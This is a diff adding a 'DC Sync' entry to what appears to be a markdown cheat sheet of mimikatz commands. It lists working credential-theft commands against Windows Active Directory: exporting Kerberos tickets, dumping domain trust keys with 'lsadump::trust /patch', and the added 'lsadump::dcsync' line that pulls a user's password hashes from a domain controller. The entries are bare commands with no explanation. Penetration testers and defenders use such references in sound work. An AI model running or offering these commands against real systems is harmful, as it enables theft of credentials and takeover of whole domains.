@@ -21,3 +21,9 @@ kerberos::list /export
 ```bash
 mimikatz.exe “privilege::debug” “lsadump::trust /patch” exit
 ```
+
+#### DC Sync
+
+```bash
+lsadump::dcsync /user:xyz\D2cy
+```
